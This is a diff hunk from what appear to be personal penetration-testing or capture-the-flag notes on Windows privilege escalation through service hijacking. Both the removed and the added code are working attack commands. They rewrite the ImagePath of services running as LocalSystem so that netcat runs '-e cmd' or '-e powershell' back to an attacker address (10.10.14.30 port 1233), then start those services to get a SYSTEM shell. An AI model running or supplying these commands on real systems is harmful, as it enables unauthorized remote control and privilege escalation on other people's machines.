@@ -397,17 +397,9 @@ foreach ($service in $services) {
 ```
 Automatically gets the old value for the service binary. Then it sets that path to nc.exe connecting back to me. It then starts the service, and the puts the original bin path back
 ```
-foreach ($service in $services) { 
-  $sddl = (cmd /c sc sdshow $service)[1]; 
-  $reg = gp -path hklm:\system\currentcontrolset\services\$service; 
-  if ($sddl -match "RP[A-Z]*?;;;AU" -and $reg.ObjectName -eq "LocalSystem") { 
-    write-host "Trying to hijack $service"; 
-    $old_path = (get-itemproperty HKLM:\system\currentcontrolset\services\wuauserv).ImagePath; 
-    set-itemproperty -erroraction silentlycontinue -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value "\windows\system32\spool\drivers\color\nc64.exe -e cmd ip port"; 
-    start-service $service -erroraction silentlycontinue; 
-    set-itemproperty -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value $old_path 
-  }
-}
+Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {Get-Service $_} 2> $null
+Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {reg.exe add "HKLM\System\CurrentControlSet\services\$_" /t REG_EXPAND_SZ /v ImagePath /d "cmd /c C:\inetpub\wwwroot\uploads\nc.exe -e powershell 10.10.14.30 1233" /f} 2> $null
+Get-Content "C:\inetpub\wwwroot\uploads\sa.txt" | ForEach-Object {start-service $_} 2> $null
 ```
 Mannually change registry service path
 ```
